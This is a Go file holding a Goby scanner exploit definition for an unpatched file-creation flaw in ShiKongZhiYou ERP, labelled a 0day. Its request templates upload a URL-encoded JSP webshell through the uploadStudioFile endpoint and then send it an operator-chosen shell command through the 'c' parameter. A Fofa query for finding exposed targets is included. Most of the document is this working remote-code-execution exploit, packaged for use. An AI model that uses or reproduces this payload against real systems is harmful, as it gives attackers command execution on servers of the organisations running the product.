package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "skzy ERP uploadStudioFile File Creation",
    "Description": "<p>Space-time Zhiyou enterprise process management and control system is committed to assisting large health enterprises to build internal informationization, solving GSP management, multi-organization management, financial management, tax control management, online and offline integration, business collaborative management, and group management. There is a file creation vulnerability in the system, through which a Webshell can be created to obtain server permissions.</p>",
    "Product": "ShiKongZhiYou-ERP",
    "Homepage": "http://www.91skzy.net/",
    "DisclosureDate": "2022-12-04",
    "Author": "1angx",
    "FofaQuery": "body=\"login.jsp?login=null\"",
    "GobyQuery": "body=\"login.jsp?login=null\"",
    "Level": "3",
    "Impact": "<p>This vulnerability can create arbitrary files, through which an attacker can write to a Webshell to gain server privileges.</p>",
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"http://www.91skzy.net/\">http://www.91skzy.net/</a></p>",
    "References": [],
    "Is0day": true,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/formservice?service=updater.uploadStudioFile",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "content=<?xml%20version=\"1.0\"?><root><filename>test.jsp</filename><filepath>./</filepath><filesize>172</filesize><lmtime>1970-01-01%2008:00:00</lmtime></root><!--%3c%25%20%6f%75%74%2e%70%72%69%6e%74%6c%6e%28%22%74%65%73%74%31%32%33%22%29%3b%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%46%69%6c%65%28%61%70%70%6c%69%63%61%74%69%6f%6e%2e%67%65%74%52%65%61%6c%50%61%74%68%28%72%65%71%75%65%73%74%2e%67%65%74%53%65%72%76%6c%65%74%50%61%74%68%28%29%29%29%2e%64%65%6c%65%74%65%28%29%3b%20%25%3e -->"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "root",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "GET",
                "uri": "/update/temp/studio/test.jsp",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test123",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/formservice?service=updater.uploadStudioFile",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "content=<?xml%20version=\"1.0\"?><root><filename>test.jsp</filename><filepath>./</filepath><filesize>172</filesize><lmtime>1970-01-01%2008:00:00</lmtime></root><!--%3c%25%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%20%69%6e%20%3d%20%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%72%65%71%75%65%73%74%2e%67%65%74%50%61%72%61%6d%65%74%65%72%28%22%63%22%29%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%3b%69%6e%74%20%61%20%3d%20%2d%31%3b%62%79%74%65%5b%5d%20%62%20%3d%20%6e%65%77%20%62%79%74%65%5b%32%30%34%38%5d%3b%6f%75%74%2e%70%72%69%6e%74%28%22%3c%70%72%65%3e%22%29%3b%77%68%69%6c%65%28%28%61%3d%69%6e%2e%72%65%61%64%28%62%29%29%21%3d%2d%31%29%7b%6f%75%74%2e%70%72%69%6e%74%6c%6e%28%6e%65%77%20%53%74%72%69%6e%67%28%62%2c%30%2c%61%29%29%3b%7d%6f%75%74%2e%70%72%69%6e%74%28%22%3c%2f%70%72%65%3e%22%29%3b%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%46%69%6c%65%28%61%70%70%6c%69%63%61%74%69%6f%6e%2e%67%65%74%52%65%61%6c%50%61%74%68%28%72%65%71%75%65%73%74%2e%67%65%74%53%65%72%76%6c%65%74%50%61%74%68%28%29%29%29%2e%64%65%6c%65%74%65%28%29%3b%25%3e-->"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        },
        {
            "Request": {
                "method": "POST",
                "uri": "/update/temp/studio/test.jsp",
                "follow_redirect": true,
                "header": {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                "data_type": "text",
                "data": "c={{{cmd}}}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|<!--<pre>(?s)(.*)</pre>-->"
            ]
        }
    ],
    "Tags": [
        "File Creation"
    ],
    "VulType": [
        "File Creation"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9",
    "Translation": {
        "CN": {
            "Name": "时空智友企业流程化管控系统 uploadStudioFile 文件创建漏洞",
            "Product": "时空智友-ERP",
            "Description": "<p>时空智友企业流程化管控系统致力于协助大健康企业构建内部信息化，解决GSP管理、多组织管理、财务管理、税控管理、线上线下一体化、商务协同管理、集团管理。该系统存在文件创建漏洞，可通过该漏洞创建Webshell获取服务器权限。<br></p>",
            "Recommendation": "<p>目前没有详细的解决方案提供，请关注厂商主页更新：<a href=\"http://www.91skzy.net/\">http://www.91skzy.net/</a><br></p>",
            "Impact": "<p>该漏洞可创建任意文件，攻击者可通过该漏洞写入Webshell获取服务器权限。</p>",
            "VulType": [
                "文件创建"
            ],
            "Tags": [
                "文件创建"
            ]
        },
        "EN": {
            "Name": "skzy ERP uploadStudioFile File Creation",
            "Product": "ShiKongZhiYou-ERP",
            "Description": "<p>Space-time Zhiyou enterprise process management and control system is committed to assisting large health enterprises to build internal informationization, solving GSP management, multi-organization management, financial management, tax control management, online and offline integration, business collaborative management, and group management. There is a file creation vulnerability in the system, through which a Webshell can be created to obtain server permissions.</p>",
            "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:</p><p><a href=\"http://www.91skzy.net/\">http://www.91skzy.net/</a></p>",
            "Impact": "<p>This vulnerability can create arbitrary files, through which an attacker can write to a Webshell to gain server privileges.<br></p>",
            "VulType": [
                "File Creation"
            ],
            "Tags": [
                "File Creation"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
